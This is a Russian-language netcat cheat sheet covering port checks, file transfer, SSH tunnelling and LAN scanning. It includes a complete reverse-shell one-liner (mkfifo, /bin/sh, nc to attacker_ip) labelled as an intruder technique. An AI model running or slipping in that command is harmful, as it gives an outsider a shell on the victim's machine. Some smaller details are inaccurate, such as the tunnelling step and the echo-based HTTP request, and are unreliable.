Утилита `netcat` — это мощный инструмент командной строки Linux, предназначенный для передачи данных между сетевыми устройствами через TCP/IP соединения. 
Она позволяет отправлять и получать данные по сети, проверять доступность сервисов, эмулировать клиентские запросы и серверные ответы, создавать туннели и многое другое. 

## Простые примеры

### Проверка доступности веб-сайта
Проверяем возможность подключения к порту HTTP сервера:
```bash
nc -vz example.com 80;
 # или
ncat -vz example.com 80;
```
Флаг `-v` включает подробный вывод, а `-z` заставляет Netcat немедленно закрывать соединение после проверки порта.

### Передача файла на удалённый хост
Передача локального файла на удалённую машину:
**Приёмник (сервер):**
```bash
nc -l 1234 > received_file.txt
```
**Отправитель (клиент):**
```bash
nc example.com 1234 < local_file.txt
```

### Эмуляция простого веб-сервера
Можно создать простой веб-сервер, возвращающий статический HTML-документ:
```bash
echo "<html><body><h1>Hello World!</h1></body></html>" | nc -l 8080
```
Теперь открываем браузер и вводим адрес `http://localhost:8080`, увидим простую страницу с текстом.

---

## Сложные примеры

### Создание обратного шелла (обратная оболочка)
Используется злоумышленниками для проникновения в систему. Для демонстрации приведён пример безопасного тестирования.

**Сервер (хост, ожидающий подключение):**
```bash
nc -lvnp 4444
```
**Клиент (машина жертвы, отправляющая команду оболочки):**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 >/tmp/f
```
Здесь создаётся FIFO-файл (`mkfifo`), который перенаправляет команды обратно атакующему хосту, создавая интерактивную сессию оболочки.

### Фильтрация трафика через SSH-туннелирование
Netcat также полезен для создания защищённых каналов связи через SSH. Например, передайте трафик через зашифрованный канал SSH, минуя внешние ограничения сети:
```bash
ssh user@remote_host -L 8080:example.com:80
```
Затем внутри сессии SSH выполняем:
```bash
nc localhost 8080
```
Это создаёт прокси-соединение от вашего компьютера к целевому сайту через шифрование SSH.

### Автоматическое создание дампа трафика в файл
Иногда полезно сохранять весь проходящий трафик через сеть в файл для последующего анализа:
```bash
nc -lvp 1234 | tee traffic_dump.log
```
Эта команда прослушивает порт и сохраняет всю входящую информацию в файл одновременно показывая её на экране терминала.

---

Netcat отлично подходит для быстрой передачи файлов между двумя машинами. 
Вот два основных способа передать файлы с использованием Netcat:

### Способ №1: Классическая передача через перенаправление ввода-вывода

#### Сервер (принимающая сторона):
1. Запустите Netcat в режиме ожидания подключений на определённом порту и направьте входящий поток данных в нужный файл:
   ```bash
   nc -lvp PORT_NUMBER > FILE_NAME
   ```
   
   Пример:
   ```bash
   nc -lvp 1234 > myfile.txt
   ```

   Здесь:
   - `-l`: режим слушателя (слушает входящие соединения).
   - `-v`: выводит дополнительную информацию (детали подключения).
   - `-p`: указывает номер порта для прослушивания.
   - `<FILE_NAME>`: имя файла, куда будут записаны полученные данные.

#### Клиент (отправляющая сторона):
1. Подключитесь к указанному IP адресу и порту, передав содержимое файла в качестве вывода:
   ```bash
   nc SERVER_IP PORT_NUMBER < FILE_NAME
   ```
   
   Пример:
   ```bash
   nc 192.168.1.100 1234 < file_to_send.txt
   ```

   Таким образом, отправляемый файл передаётся по сети на принимающую сторону, где он сохраняется в указанный файл.

---

### Способ №2: Использование встроенных команд для автоматизации процесса отправки и приёма

Если вам нужен автоматизированный способ отправки и приёмки файла одним простым действием, можно воспользоваться комбинацией Netcat и Bash-сценарием.

#### Отправка файла автоматически:
```bash
#!/bin/bash
IP="REMOTE_SERVER_IP"
PORT=1234
FILE="myfile.txt"

# Отправляем файл
nc "$IP" "$PORT" < "$FILE"
```

#### Приём файла автоматически:
```bash
#!/bin/bash
PORT=1234
OUTPUT_FILE="received_file.txt"

# Ждём подключения и сохраняем полученный файл
nc -lvp "$PORT" > "$OUTPUT_FILE"
```

Таким образом, оба сценария работают вместе: один запускается на стороне клиента для отправки файла, другой — на стороне сервера для его приёма.
Использовать netcat для передачи файлов вместе с SSh-туннелем. См.: [SSH-tunnel](https://github.com/sherbettt/BASH-cheats/blob/main/12.2.%20SSH-туннель%20и%20sshuttle.md)

---

Netcat является мощным инструментом для диагностики сетевых служб и проверки доступности машин в сети. Вот несколько способов использования Netcat для проверки состояния машины:

### 1. Проверка доступности порта на удаленной машине
Чтобы убедиться, что определенный порт доступен на удалённой машине, можно использовать Netcat в следующем виде:

```bash
nc -zv TARGET_IP PORT
```

Примеры:
- Проверка открытого порта HTTP (порт 80):
  ```bash
  nc -zv www.example.com 80
  ```
  
- Проверка SSH-службы (порт 22):
  ```bash
  nc -zv server.example.net 22
  ```

Флаги:
- `-z`: проверка без установления реального соединения (сканирует состояние порта);
- `-v`: отображает подробную информацию о результате сканирования.

### 2. Тестирование DNS-разрешения имени хоста
Можно быстро определить, правильно ли разрешается имя хоста в IP-адрес:

```bash
nc -vzw 1 HOSTNAME PORT
```

Флаг `-w 1` устанавливает таймаут ожидания ответа равным одной секунде.

### 3. Диагностика проблемы с сетью путем отправки тестовых пакетов
Netcat может использоваться для отправки произвольных сообщений или файлов на удалённые сервисы, чтобы увидеть реакцию:

```bash
echo "GET / HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
```

Эта команда отправит HTTP-запрос и выведет ответ от веб-сервера.

### 4. Обнаружение активного устройства в сети
Вы можете использовать Netcat совместно с циклом bash для быстрого сканирования диапазона IP-адресов и выявления активных устройств:

```bash
for ip in {1..254}; do
  echo "Testing 192.168.1.$ip..."
  if nc -w 1 -z 192.168.1.$ip 80 &>/dev/null; then
    echo "Device found at 192.168.1.$ip"
  fi
done
```

Этот скрипт проверяет наличие активных устройств в диапазоне локальной сети по порту 80.

### 5. Анализ задержек и пропускной способности сети
Хотя Netcat изначально не предназначен для измерения производительности сети, его можно использовать для оценки скорости загрузки файлов или задержки:

```bash
nc -vv server.example.org 80 < large_file.bin
```

Такая команда покажет скорость передачи большого файла и позволит оценить качество канала связи.

---

